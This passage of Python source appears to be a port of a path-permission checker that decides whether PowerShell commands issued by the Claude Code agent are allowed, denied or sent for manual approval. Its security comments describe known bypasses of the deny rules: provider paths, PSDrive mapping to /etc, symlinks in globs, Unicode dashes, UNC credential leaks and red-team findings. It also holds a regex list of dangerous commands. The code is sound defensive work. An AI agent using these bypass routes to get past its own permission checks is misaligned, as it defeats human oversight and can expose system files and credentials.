                'allowed': False,
                'resolvedPath': denyHit['resolvedPath'],
                'decisionReason': {'type': 'rule', 'rule': denyHit['rule']},
            }
        return {
            'allowed': False,
            'resolvedPath': normalizedPath,
            'decisionReason': {
                'type': 'other',
                'reason':
                    'Backtick escape characters in paths cannot be statically validated and require manual approval',
            },
        }

    # SECURITY: Block module-qualified provider paths. PowerShell allows
    # `Microsoft.PowerShell.Core\FileSystem::/etc/passwd` which resolves to
    # `/etc/passwd` via the FileSystem provider. The `::` is the provider
    # path separator and doesn't match the simple `^[a-z]{2,}:` regex.
    if '::' in normalizedPath:
        # Strip everything up to and including the first :: — handles both
        # FileSystem::/path and Microsoft.PowerShell.Core\FileSystem::/path.
        # Double-:: (Foo::Bar::/x) strips first only → 'Bar::/x' → resolve
        # makes it {cwd}/Bar::/x → won't match real deny rules → falls to ask.
        # Safe.
        afterProvider = normalizedPath[normalizedPath.index('::') + 2:]
        denyHit = checkDenyRuleForGuessedPath(
            afterProvider,
            cwd,
            toolPermissionContext,
            operationType,
        )
        if denyHit:
            return {
                'allowed': False,
                'resolvedPath': denyHit['resolvedPath'],
                'decisionReason': {'type': 'rule', 'rule': denyHit['rule']},
            }
        return {
            'allowed': False,
            'resolvedPath': normalizedPath,
            'decisionReason': {
                'type': 'other',
                'reason':
                    'Module-qualified provider paths (::) cannot be statically validated and require manual approval',
            },
        }

    # SECURITY: Block UNC paths — they can trigger network requests and
    # leak NTLM/Kerberos credentials
    if (
        normalizedPath.startswith('//') or
        re.search(r'DavWWWRoot', normalizedPath, re.IGNORECASE) or
        re.search(r'@SSL@', normalizedPath, re.IGNORECASE)
    ):
        return {
            'allowed': False,
            'resolvedPath': normalizedPath,
            'decisionReason': {
                'type': 'other',
                'reason':
                    'UNC paths are blocked because they can trigger network requests and credential leakage',
            },
        }

    # SECURITY: Reject paths containing shell expansion syntax
    if '$' in normalizedPath or '%' in normalizedPath:
        return {
            'allowed': False,
            'resolvedPath': normalizedPath,
            'decisionReason': {
                'type': 'other',
                'reason': 'Variable expansion syntax in paths requires manual approval',
            },
        }

    # SECURITY: Block non-filesystem provider paths (env:, HKLM:, alias:, function:, etc.)
    # These paths access non-filesystem resources and must require manual approval.
    # This catches colon-syntax like -Path:env:HOME where the extracted value is 'env:HOME'.
    #
    # Platform split (findings #21/#28):
    # - Windows: require 2+ letters before ':' so native drive letters (C:, D:)
    #   pass through to path.win32.isAbsolute/resolve which handle them correctly.
    # - POSIX: ANY <letters>: prefix is a PowerShell PSDrive — single-letter drive
    #   paths have no native meaning on Linux/macOS. `New-PSDrive -Name Z -Root /etc`
    #   then `Get-Content Z:/secrets` would otherwise resolve via
    #   path.posix.resolve(cwd, 'Z:/secrets') → '{cwd}/Z:/secrets' → inside cwd →
    #   allowed, bypassing Read(/etc/**) deny rules. We cannot statically know what
    #   filesystem root a PSDrive maps to, so treat all drive-prefixed paths on
    #   POSIX as unvalidatable.
    # Include digits in PSDrive name (bug #23): `New-PSDrive -Name 1 ...`
    # creates drive `1:` — a valid PSDrive path prefix.
    # Windows regex requires 2+ chars to exclude single-letter native drive letters
    # (C:, D:). Use a single character class [a-z0-9] to catch mixed alphanumeric
    # PSDrive names like `a1:`, `1a:` — the previous alternation `[a-z]{2,}|[0-9]+`
    # missed those since `a1` is neither pure letters nor pure digits.
    platform = getPlatform()
    providerPathRegex = re.compile(r'^[a-z0-9]{2,}:', re.IGNORECASE) if platform == 'windows' else re.compile(r'^[a-z0-9]+:', re.IGNORECASE)
    
    if providerPathRegex.match(normalizedPath):
        return {
            'allowed': False,
            'resolvedPath': normalizedPath,
            'decisionReason': {
                'type': 'other',
                'reason': f"Path '{normalizedPath}' uses a non-filesystem provider and requires manual approval",
            },
        }

    # SECURITY: Block glob patterns in write/create operations
    if GLOB_PATTERN_REGEX.search(normalizedPath):
        if operationType in ('write', 'create'):
            return {
                'allowed': False,
                'resolvedPath': normalizedPath,
                'decisionReason': {
                    'type': 'other',
                    'reason':
                        'Glob patterns are not allowed in write operations. Please specify an exact file path.',
                },
            }

        # For read operations with path traversal (e.g., /project/*/../../../etc/shadow),
        # resolve the full path (including glob chars) and validate that resolved path.
        # This catches patterns that escape the working directory via `..` after the glob.
        if containsPathTraversal(normalizedPath):
            absolutePath = normalizedPath if os.path.isabs(normalizedPath) else os.path.join(cwd, normalizedPath)
            resolved_result = safeResolvePath(getFsImplementation(), absolutePath)
            resolvedPath = resolved_result['resolvedPath']
            isCanonical = resolved_result.get('isCanonical', False)
            
            result = isPathAllowed(
                resolvedPath,
                toolPermissionContext,
                operationType,
                [resolvedPath] if isCanonical else None,
            )
            return {
                'allowed': result['allowed'],
                'resolvedPath': resolvedPath,
                'decisionReason': result.get('decisionReason'),
            }

        # SECURITY (finding #15): Glob patterns for read operations cannot be
        # statically validated. getGlobBaseDirectory returns the directory before
        # the first glob char; only that base is realpathed. Anything matched by
        # the glob (including symlinks) is never examined. Example:
        #   /project/*/passwd with symlink /project/link → /etc
        # Base dir is /project (allowed), but runtime expands * to 'link' and
        # reads /etc/passwd. We cannot validate symlinks inside glob expansion
        # without actually expanding the glob (requires filesystem access and
        # still races with attacker creating symlinks post-validation).
        #
        # Still check deny rules on the base directory so explicit Read(/project/**)
        # deny rules fire. If no deny matches, force ask.
        basePath = getGlobBaseDirectory(normalizedPath)
        absoluteBasePath = basePath if os.path.isabs(basePath) else os.path.join(cwd, basePath)
        resolvedPath = safeResolvePath(getFsImplementation(), absoluteBasePath)['resolvedPath']
        
        permissionType = 'read' if operationType == 'read' else 'edit'
        denyRule = matchingRuleForInput(
            resolvedPath,
            toolPermissionContext,
            permissionType,
            'deny',
        )
        if denyRule is not None:
            return {
                'allowed': False,
                'resolvedPath': resolvedPath,
                'decisionReason': {'type': 'rule', 'rule': denyRule},
            }
        return {
            'allowed': False,
            'resolvedPath': resolvedPath,
            'decisionReason': {
                'type': 'other',
                'reason':
                    'Glob patterns in paths cannot be statically validated — symlinks inside the glob expansion are not examined. Requires manual approval.',
            },
        }

    # Resolve path
    absolutePath = normalizedPath if os.path.isabs(normalizedPath) else os.path.join(cwd, normalizedPath)
    resolved_result = safeResolvePath(getFsImplementation(), absolutePath)
    resolvedPath = resolved_result['resolvedPath']
    isCanonical = resolved_result.get('isCanonical', False)

    result = isPathAllowed(
        resolvedPath,
        toolPermissionContext,
        operationType,
        [resolvedPath] if isCanonical else None,
    )
    return {
        'allowed': result['allowed'],
        'resolvedPath': resolvedPath,
        'decisionReason': result.get('decisionReason'),
    }


def getGlobBaseDirectory(filePath: str) -> str:
    """Extract the base directory before the first glob character."""
    globMatch = GLOB_PATTERN_REGEX.search(filePath)
    if not globMatch:
        return filePath
    
    beforeGlob = filePath[:globMatch.start()]
    # Find last separator
    lastSepIndex = max(beforeGlob.rfind('/'), beforeGlob.rfind('\\'))
    if lastSepIndex == -1:
        return '.'
    return beforeGlob[:lastSepIndex + 1] or '/'


# ============================================================
# CHECK PATH CONSTRAINTS (Phase 5)
# ============================================================

def checkPathConstraintsForStatement(
    statement: Dict[str, Any],
    toolPermissionContext: ToolPermissionContext,
    compoundCommandHasCd: bool = False,
) -> PermissionResult:
    """
    Checks path constraints for a single PowerShell statement.
    Called by checkPathConstraints for each statement in the parsed command.
    """
    cwd = getCwd()
    firstAsk: Optional[PermissionResult] = None
    
    # SECURITY: BashTool parity — block path operations in compound commands
    # containing a cwd-changing cmdlet
    if compoundCommandHasCd:
        firstAsk = {
            'behavior': 'ask',
            'message': 'Compound command changes working directory (Set-Location/Push-Location/Pop-Location/New-PSDrive) — relative paths cannot be validated against the original cwd and require manual approval',
            'decisionReason': {
                'type': 'other',
                'reason': 'Compound command contains cd with path operation — manual approval required to prevent path resolution bypass',
            },
        }
    
    # SECURITY: Track whether this statement contains a non-CommandAst pipeline
    # element (string literal, variable, array expression)
    hasExpressionPipelineSource = False
    pipelineSourceText: Optional[str] = None
    
    for cmd in statement.get('commands', []):
        if cmd.get('elementType') != 'CommandAst':
            hasExpressionPipelineSource = True
            pipelineSourceText = cmd.get('text')
            continue
        
        extracted = extractPathsFromCommand(cmd)
        paths = extracted['paths']
        operationType = extracted['operationType']
        hasUnvalidatablePathArg = extracted['hasUnvalidatablePathArg']
        optionalWrite = extracted['optionalWrite']
        
        # SECURITY: Cmdlet receiving piped path from expression source
        if hasExpressionPipelineSource:
            canonical = resolveToCanonical(cmd.get('name', ''))
            # Check deny rules on pipeline source text
            if pipelineSourceText is not None:
                stripped = re.sub(r"^['\"]|['\"]$", '', pipelineSourceText)
                denyHit = checkDenyRuleForGuessedPath(
                    stripped,
                    cwd,
                    toolPermissionContext,
                    operationType,
                )
                if denyHit:
                    return {
                        'behavior': 'deny',
                        'message': f"{canonical} targeting '{denyHit['resolvedPath']}' was blocked by a deny rule",
                        'decisionReason': {'type': 'rule', 'rule': denyHit['rule']},
                    }
            if firstAsk is None:
                firstAsk = {
                    'behavior': 'ask',
                    'message': f"{canonical} receives its path from a pipeline expression source that cannot be statically validated and requires manual approval",
                }
        
        # SECURITY: Array literals, subexpressions, and other complex argument types
        if hasUnvalidatablePathArg:
            canonical = resolveToCanonical(cmd.get('name', ''))
            if firstAsk is None:
                firstAsk = {
                    'behavior': 'ask',
                    'message': f"{canonical} uses a parameter or complex path expression (array literal, subexpression, unknown parameter, etc.) that cannot be statically validated and requires manual approval",
                }
        
        # SECURITY: Write cmdlet with zero extracted paths
        if (
            operationType != 'read' and
            not optionalWrite and
            len(paths) == 0 and
            resolveToCanonical(cmd.get('name', '')) in CMDLET_PATH_CONFIG
        ):
            canonical = resolveToCanonical(cmd.get('name', ''))
            if firstAsk is None:
                firstAsk = {
                    'behavior': 'ask',
                    'message': f"{canonical} is a write operation but no target path could be determined; requires manual approval",
                }
            continue
        
        # SECURITY: bash-parity hard-deny for removal cmdlets on system-critical paths
        isRemoval = resolveToCanonical(cmd.get('name', '')) == 'remove-item'
        
        for filePath in paths:
            # Check the RAW path first (pre-realpath)
            if isRemoval and isDangerousRemovalRawPath(filePath):
                return dangerousRemovalDeny(filePath)
            
            validation = validatePath(
                filePath,
                cwd,
                toolPermissionContext,
                operationType,
            )
            
            # Also check the resolved path — catches symlinks
            if isRemoval and isDangerousRemovalPath(validation.get('resolvedPath', '')):
                return dangerousRemovalDeny(validation['resolvedPath'])
            
            if not validation['allowed']:
                canonical = resolveToCanonical(cmd.get('name', ''))
                workingDirs = list(allWorkingDirectories(toolPermissionContext))
                dirListStr = formatDirectoryList(workingDirs)
                
                decisionReason = validation.get('decisionReason', {})
                if decisionReason.get('type') in ('other', 'safetyCheck'):
                    message = decisionReason.get('reason', 'Path not allowed')
                else:
                    message = f"{canonical} targeting '{validation.get('resolvedPath')}' was blocked. For security, Claude Code may only access files in the allowed working directories for this session: {dirListStr}."
                
                if decisionReason.get('type') == 'rule':
                    return {
                        'behavior': 'deny',
                        'message': message,
                        'decisionReason': decisionReason,
                    }
                
                suggestions: List[PermissionUpdate] = []
                if validation.get('resolvedPath'):
                    if operationType == 'read':
                        suggestion = createReadRuleSuggestion(
                            getDirectoryForPath(validation['resolvedPath']),
                            'session',
                        )
                        if suggestion:
                            suggestions.append(suggestion)
                    else:
                        suggestions.append({
                            'type': 'addDirectories',
                            'directories': [getDirectoryForPath(validation['resolvedPath'])],
                            'destination': 'session',
                        })
                
                if operationType in ('write', 'create'):
                    suggestions.append({
                        'type': 'setMode',
                        'mode': 'acceptEdits',
                        'destination': 'session',
                    })
                
                if firstAsk is None:
                    firstAsk = {
                        'behavior': 'ask',
                        'message': message,
                        'blockedPath': validation.get('resolvedPath'),
                        'decisionReason': decisionReason,
                        'suggestions': suggestions,
                    }
    
    # Check nested commands from control flow
    for cmd in statement.get('nestedCommands', []):
        extracted = extractPathsFromCommand(cmd)
        paths = extracted['paths']
        operationType = extracted['operationType']
        hasUnvalidatablePathArg = extracted['hasUnvalidatablePathArg']
        optionalWrite = extracted['optionalWrite']
        
        if hasUnvalidatablePathArg:
            canonical = resolveToCanonical(cmd.get('name', ''))
            if firstAsk is None:
                firstAsk = {
                    'behavior': 'ask',
                    'message': f"{canonical} uses a parameter or complex path expression (array literal, subexpression, unknown parameter, etc.) that cannot be statically validated and requires manual approval",
                }
        
        # SECURITY: Write cmdlet with zero extracted paths
        if (
            operationType != 'read' and
            not optionalWrite and
            len(paths) == 0 and
            resolveToCanonical(cmd.get('name', '')) in CMDLET_PATH_CONFIG
        ):
            canonical = resolveToCanonical(cmd.get('name', ''))
            if firstAsk is None:
                firstAsk = {
                    'behavior': 'ask',
                    'message': f"{canonical} is a write operation but no target path could be determined; requires manual approval",
                }
            continue
        
        # SECURITY: bash-parity hard-deny for removal
        isRemoval = resolveToCanonical(cmd.get('name', '')) == 'remove-item'
        
        for filePath in paths:
            if isRemoval and isDangerousRemovalRawPath(filePath):
                return dangerousRemovalDeny(filePath)
            
            validation = validatePath(
                filePath,
                cwd,
                toolPermissionContext,
                operationType,
            )
            
            if isRemoval and isDangerousRemovalPath(validation.get('resolvedPath', '')):
                return dangerousRemovalDeny(validation['resolvedPath'])
            
            if not validation['allowed']:
                canonical = resolveToCanonical(cmd.get('name', ''))
                workingDirs = list(allWorkingDirectories(toolPermissionContext))
                dirListStr = formatDirectoryList(workingDirs)
                
                decisionReason = validation.get('decisionReason', {})
                if decisionReason.get('type') in ('other', 'safetyCheck'):
                    message = decisionReason.get('reason', 'Path not allowed')
                else:
                    message = f"{canonical} targeting '{validation.get('resolvedPath')}' was blocked. For security, Claude Code may only access files in the allowed working directories for this session: {dirListStr}."
                
                if decisionReason.get('type') == 'rule':
                    return {
                        'behavior': 'deny',
                        'message': message,
                        'decisionReason': decisionReason,
                    }
                
                suggestions: List[PermissionUpdate] = []
                if validation.get('resolvedPath'):
                    if operationType == 'read':
                        suggestion = createReadRuleSuggestion(
                            getDirectoryForPath(validation['resolvedPath']),
                            'session',
                        )
                        if suggestion:
                            suggestions.append(suggestion)
                    else:
                        suggestions.append({
                            'type': 'addDirectories',
                            'directories': [getDirectoryForPath(validation['resolvedPath'])],
                            'destination': 'session',
                        })
                
                if operationType in ('write', 'create'):
                    suggestions.append({
                        'type': 'setMode',
                        'mode': 'acceptEdits',
                        'destination': 'session',
                    })
                
                if firstAsk is None:
                    firstAsk = {
                        'behavior': 'ask',
                        'message': message,
                        'blockedPath': validation.get('resolvedPath'),
                        'decisionReason': decisionReason,
                        'suggestions': suggestions,
                    }
        
        # Red-team P11/P14: check for expression pipeline source in nested commands
        if hasExpressionPipelineSource:
            if firstAsk is None:
                firstAsk = {
                    'behavior': 'ask',
                    'message': f"{resolveToCanonical(cmd.get('name', ''))} appears inside a control-flow or chain statement where piped expression sources cannot be statically validated and requires manual approval",
                }
    
    # Check redirections on nested commands
    for cmd in statement.get('nestedCommands', []):
        for redir in cmd.get('redirections', []):
            if redir.get('isMerging'):
                continue
            if not redir.get('target'):
                continue
            if isNullRedirectionTarget(redir['target']):
                continue
            
            validation = validatePath(
                redir['target'],
                cwd,
                toolPermissionContext,
                'create',
            )
            
            if not validation['allowed']:
                workingDirs = list(allWorkingDirectories(toolPermissionContext))
                dirListStr = formatDirectoryList(workingDirs)
                
                decisionReason = validation.get('decisionReason', {})
                if decisionReason.get('type') in ('other', 'safetyCheck'):
                    message = decisionReason.get('reason', 'Path not allowed')
                else:
                    message = f"Output redirection to '{validation.get('resolvedPath')}' was blocked. For security, Claude Code may only write to files in the allowed working directories for this session: {dirListStr}."
                
                if decisionReason.get('type') == 'rule':
                    return {
                        'behavior': 'deny',
                        'message': message,
                        'decisionReason': decisionReason,
                    }
                
                if firstAsk is None:
                    firstAsk = {
                        'behavior': 'ask',
                        'message': message,
                        'blockedPath': validation.get('resolvedPath'),
                        'decisionReason': decisionReason,
                        'suggestions': [
                            {
                                'type': 'addDirectories',
                                'directories': [getDirectoryForPath(validation['resolvedPath'])],
                                'destination': 'session',
                            },
                        ],
                    }
    
    # Check file redirections
    for redir in statement.get('redirections', []):
        if redir.get('isMerging'):
            continue
        if not redir.get('target'):
            continue
        if isNullRedirectionTarget(redir['target']):
            continue
        
        validation = validatePath(
            redir['target'],
            cwd,
            toolPermissionContext,
            'create',
        )
        
        if not validation['allowed']:
            workingDirs = list(allWorkingDirectories(toolPermissionContext))
            dirListStr = formatDirectoryList(workingDirs)
            
            decisionReason = validation.get('decisionReason', {})
            if decisionReason.get('type') in ('other', 'safetyCheck'):
                message = decisionReason.get('reason', 'Path not allowed')
            else:
                message = f"Output redirection to '{validation.get('resolvedPath')}' was blocked. For security, Claude Code may only write to files in the allowed working directories for this session: {dirListStr}."
            
            if decisionReason.get('type') == 'rule':
                return {
                    'behavior': 'deny',
                    'message': message,
                    'decisionReason': decisionReason,
                }
            
            if firstAsk is None:
                firstAsk = {
                    'behavior': 'ask',
                    'message': message,
                    'blockedPath': validation.get('resolvedPath'),
                    'decisionReason': decisionReason,
                    'suggestions': [
                        {
                            'type': 'addDirectories',
                            'directories': [getDirectoryForPath(validation['resolvedPath'])],
                            'destination': 'session',
                        },
                    ],
                }
    
    return firstAsk if firstAsk else {
        'behavior': 'passthrough',
        'message': 'All path constraints validated successfully',
    }


def checkPathConstraints(
    input_cmd: Dict[str, Any],
    parsed: ParsedPowerShellCommand,
    toolPermissionContext: ToolPermissionContext,
    compoundCommandHasCd: bool = False,
) -> PermissionResult:
    """
    Checks path constraints for PowerShell commands.
    Extracts file paths from the parsed AST and validates they are
    within allowed directories.
    
    Returns:
        - 'ask' if any path command tries to access outside allowed directories
        - 'deny' if a deny rule explicitly blocks the path
        - 'passthrough' if no path commands were found or all paths are valid
    """
    if not parsed.get('valid', False):
        return {
            'behavior': 'passthrough',
            'message': 'Cannot validate paths for unparsed command',
        }
    
    # SECURITY: Two-pass approach — check ALL statements/paths so deny rules
    # always take precedence over ask
    firstAsk: Optional[PermissionResult] = None
    
    for statement in parsed.get('statements', []):
        result = checkPathConstraintsForStatement(
            statement,
            toolPermissionContext,
            compoundCommandHasCd,
        )
        if result.get('behavior') == 'deny':
            return result
        if result.get('behavior') == 'ask' and firstAsk is None:
            firstAsk = result
    
    return firstAsk if firstAsk else {
        'behavior': 'passthrough',
        'message': 'All path constraints validated successfully',
    }


def shouldBlockCommand(
    commandText: str,
    cwd: str,
    toolPermissionContext: ToolPermissionContext,
) -> bool:
    """
    Quick check: should this command be blocked entirely?
    Used for pre-validation before AST parsing.
    """
    # Check for obvious dangerous patterns
    dangerous_patterns = [
        # System directory modifications
        r'Remove-Item.*System32',
        r'del.*System32',
        r'rm.*System32',
        
        # Environment variable manipulation
        r'\$env:Path\s*=',
        r'Set-Item.*env:Path',
        
        # Registry modifications
        r'Set-ItemProperty.*HKLM:',
        r'New-Item.*HKLM:',
        r'Remove-Item.*HKLM:',
        
        # Provider path access
        r'Microsoft\.PowerShell\.Core\\FileSystem::',
        
        # UNC paths (network credential leakage)
        r'\\\\[^\\]+\\',
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, commandText, re.IGNORECASE):
            return True
    
    return False


def extractAndValidatePaths(
    commandText: str,
    cwd: str,
    toolPermissionContext: ToolPermissionContext,
    operationType: Optional[FileOperationType] = None,
) -> Dict[str, Any]:
    """
    Convenience function: extract paths and return simplified validation result.
    Used by PowerShellTool to quickly check command safety.
    """
    # Quick pre-check
    if shouldBlockCommand(commandText, cwd, toolPermissionContext):
        return {
            'allowed': False,
            'blocked': True,
            'reason': 'Command matches dangerous pattern patterns',
            'paths': [],
        }
    
    # Full validation
    result = validatePowerShellCommand(
        commandText,
        cwd,
        toolPermissionContext,
        operationType,
    )
    
    return {
        'allowed': result['allowed'],
        'blocked': False,
        'requiresApproval': result['requiresApproval'],
        'approvalReasons': result.get('approvalReasons', []),
        'paths': result['constraints']['extractedPaths'],
        'redirectPaths': result['constraints']['redirectPaths'],
    }


def checkCommandSafety(
    commandText: str,
    cwd: str,
    toolPermissionContext: ToolPermissionContext,
    context: dict,
) -> Dict[str, Any]:
    """
    Comprehensive command safety check.
    Integrates with PowerShellTool permission system.
    """
    # Check if command has any file operations
    has_file_ops = any(
        cmd in commandText.lower()
        for cmd in [
            'get-content', 'cat', 'type',
            'set-content', 'out-file', '>', '>>',
            'new-item', 'ni',
            'remove-item', 'ri', 'rm', 'del',
            'copy-item', 'cp', 'copy',
            'move-item', 'mv', 'move',
            'add-content',
        ]
    )
    
    if not has_file_ops:
        return {
            'hasFileOperations': False,
            'allowed': True,
            'requiresApproval': False,
            'message': 'No file operations detected',
        }
    
    # Determine operation type from command
    command_lower = commandText.lower()
    if any(cmd in command_lower for cmd in ['remove-item', 'ri ', 'rm ', 'del ', 'erase ']):
        op_type = 'delete'
    elif any(cmd in command_lower for cmd in ['set-content', 'out-file', 'add-content', '>', '>>']):
        op_type = 'write'
    elif any(cmd in command_lower for cmd in ['new-item', 'ni ']):
        op_type = 'create'
    elif any(cmd in command_lower for cmd in ['copy-item', 'cp ', 'copy ']):
        op_type = 'write'  # Copy writes to destination
    elif any(cmd in command_lower for cmd in ['move-item', 'mv ', 'move ']):
        op_type = 'write'  # Move writes to destination
    else:
        op_type = 'read'
    
    # Validate command
    result = validatePowerShellCommand(
        commandText,
        cwd,
        toolPermissionContext,
        op_type,
    )
    
    # Build response
    if result['allowed']:
        return {
            'hasFileOperations': True,
            'operationType': op_type,
            'allowed': True,
            'requiresApproval': False,
            'message': 'Command is allowed',
            'pathCount': len(result['constraints']['extractedPaths']),
        }
    else:
        return {
            'hasFileOperations': True,
            'operationType': op_type,
            'allowed': False,
            'requiresApproval': result['requiresApproval'],
            'message': 'Command requires approval',
            'reasons': result['approvalReasons'],
            'pathCount': len(result['constraints']['extractedPaths']),
        }


# ============================================================
# EXTRACT PATHS FROM COMMAND (Phase 3)
# ============================================================

def containsPathTraversal(pathStr: str) -> bool:
    """Check if path contains .. traversal patterns."""
    return '..' in pathStr


def extractPathsFromCommand(cmd: ParsedCommandElement) -> Dict[str, Any]:
    """
    Extract file paths from a parsed PowerShell command element.
    Uses the AST args to find positional and named path parameters.
    
    If any path argument has a complex elementType (e.g., array literal,
    subexpression) that cannot be statically validated, sets
    hasUnvalidatablePathArg so the caller can force an ask.
    
    Returns:
        - paths: List of extracted path strings
        - operationType: 'read' | 'write' | 'create'
        - hasUnvalidatablePathArg: Whether any arg couldn't be validated
        - optionalWrite: Whether cmdlet only writes when pathParam present
    """
    canonical = resolveToCanonical(cmd.get('name', ''))
    config = CMDLET_PATH_CONFIG.get(canonical)
    
    if not config:
        return {
            'paths': [],
            'operationType': 'read',
            'hasUnvalidatablePathArg': False,
            'optionalWrite': False,
        }
    
    # Build per-cmdlet known-param sets, merging in common parameters
    switchParams = config.get('knownSwitches', []) + COMMON_SWITCHES
    valueParams = config.get('knownValueParams', []) + COMMON_VALUE_PARAMS
    
    paths: List[str] = []
    args = cmd.get('args', [])
    # elementTypes[0] is the command name; elementTypes[i+1] corresponds to args[i]
    elementTypes = cmd.get('elementTypes', [])
    hasUnvalidatablePathArg = False
    positionalsSeen = 0
    positionalSkip = config.get('positionalSkip', 0) or 0
    
    def checkArgElementType(argIdx: int) -> None:
        nonlocal hasUnvalidatablePathArg
        if not elementTypes:
            return
        et = elementTypes[argIdx + 1] if argIdx + 1 < len(elementTypes) else None
        if et and et not in SAFE_PATH_ELEMENT_TYPES:
            hasUnvalidatablePathArg = True
    
    # Extract named parameter values (e.g., -Path "C:\foo")
    i = 0
    while i < len(args):
        arg = args[i]
        if not arg:
            i += 1
            continue
        
        # Check if this arg is a parameter name
        # SECURITY: Use elementTypes as ground truth. PowerShell's tokenizer
        # accepts en-dash/em-dash/horizontal-bar (U+2013/2014/2015) as parameter
        # prefixes; a raw startsWith('-') check misses `–Path` (en-dash). The
        # parser maps CommandParameterAst → 'Parameter' regardless of dash char.
        # isPowerShellParameter also correctly rejects quoted "-Include"
        # (StringConstant, not a parameter).
        argElementType = elementTypes[i + 1] if elementTypes and i + 1 < len(elementTypes) else None
        if isPowerShellParameter(arg, argElementType):
            # Handle colon syntax: -Path:C:\secret
            # Normalize Unicode dash to ASCII `-` (pathParams are stored with `-`).
            normalized = '-' + arg[1:]
            colonIdx = normalized.find(':', 1)  # skip first char (the dash)
            paramName = normalized[0:colonIdx] if colonIdx > 0 else normalized
            paramLower = paramName.lower()
            
            if matchesParam(paramLower, config.get('pathParams', [])):
                # Known path parameter — extract its value as a path
                value: Optional[str] = None
                if colonIdx > 0:
                    # Colon syntax: -Path:value — the whole thing is one element
                    # SECURITY: comma-separated values (e.g., -Path:safe.txt,/etc/passwd)
                    # produce ArrayLiteralExpressionAst inside the CommandParameterAst.
                    # PowerShell writes to ALL paths, but we see a single string.
                    rawValue = arg[colonIdx + 1:]
                    if hasComplexColonValue(rawValue):
                        hasUnvalidatablePathArg = True
                    else:
                        value = rawValue
                else:
                    # Standard syntax: -Path value
                    nextVal = args[i + 1] if i + 1 < len(args) else None
                    nextType = elementTypes[i + 2] if elementTypes and i + 2 < len(elementTypes) else None
                    if nextVal and not isPowerShellParameter(nextVal, nextType):
                        value = nextVal
                        checkArgElementType(i + 1)
                        i += 1  # Skip the value
                if value:
                    paths.append(value)
            elif config.get('leafOnlyPathParams') and matchesParam(paramLower, config.get('leafOnlyPathParams', [])):
                # Leaf-only path parameter (e.g., New-Item -Name)
                value: Optional[str] = None
                if colonIdx > 0:
                    rawValue = arg[colonIdx + 1:]
                    if hasComplexColonValue(rawValue):
                        hasUnvalidatablePathArg = True
                    else:
                        value = rawValue
                else:
                    nextVal = args[i + 1] if i + 1 < len(args) else None
                    nextType = elementTypes[i + 2] if elementTypes and i + 2 < len(elementTypes) else None
                    if nextVal and not isPowerShellParameter(nextVal, nextType):
                        value = nextVal
                        checkArgElementType(i + 1)
                        i += 1
                if value is not None:
                    if '/' in value or '\\' in value or value == '.' or value == '..':
                        # Non-leaf: separators or traversal. Can't resolve correctly
                        # without joining against -Path. Force ask.
                        hasUnvalidatablePathArg = True
                    else:
                        # Simple leaf: extract
                        paths.append(value)
            elif matchesParam(paramLower, switchParams):
                # Known switch parameter — takes no value, do NOT consume next arg
                pass
            elif matchesParam(paramLower, valueParams):
                # Known value-taking non-path parameter (e.g., -Encoding UTF8, -Filter *.txt)
                # Consume its value; do NOT validate as path, but DO check elementType
                if colonIdx > 0:
                    # Colon syntax: -Value:$env:FOO — the value is embedded in the token
                    rawValue = arg[colonIdx + 1:]
                    if hasComplexColonValue(rawValue):
                        hasUnvalidatablePathArg = True
                else:
                    nextArg = args[i + 1] if i + 1 < len(args) else None
                    nextArgType = elementTypes[i + 2] if elementTypes and i + 2 < len(elementTypes) else None
                    if nextArg and not isPowerShellParameter(nextArg, nextArgType):
                        checkArgElementType(i + 1)
                        i += 1  # Skip the parameter's value
            else:
                # Unknown parameter — we do not understand this invocation
                # SECURITY: This is the structural fix for the KNOWN_SWITCH_PARAMS
                # whack-a-mole. Rather than guess whether this param is a switch
                # (and risk swallowing a positional path) or takes a value (and
                # risk the same), we flag the whole command as unvalidatable.
                hasUnvalidatablePathArg = True
                # SECURITY: Even though we don't recognize this param, if it uses
                # colon syntax (-UnknownParam:/etc/hosts) the bound value might be
                # a filesystem path. Extract it into paths[] so deny-rule matching
                # still runs.
                if colonIdx > 0:
                    rawValue = arg[colonIdx + 1:]
                    if not hasComplexColonValue(rawValue):
                        paths.append(rawValue)
                # Continue the loop so we still extract any recognizable paths
            i += 1
            continue
        
        # Positional arguments: extract as paths (e.g., Get-Content file.txt)
        # The first positional arg is typically the source path.
        # Skip leading positionals that are non-path values (e.g., iwr's -Uri).
        if positionalsSeen < positionalSkip:
            positionalsSeen += 1
            i += 1
            continue
        positionalsSeen += 1
        checkArgElementType(i)
        paths.append(arg)
        i += 1
    
    return {
        'paths': paths,
        'operationType': config['operationType'],
        'hasUnvalidatablePathArg': hasUnvalidatablePathArg,
        'optionalWrite': config.get('optionalWrite', False) or False,
    }
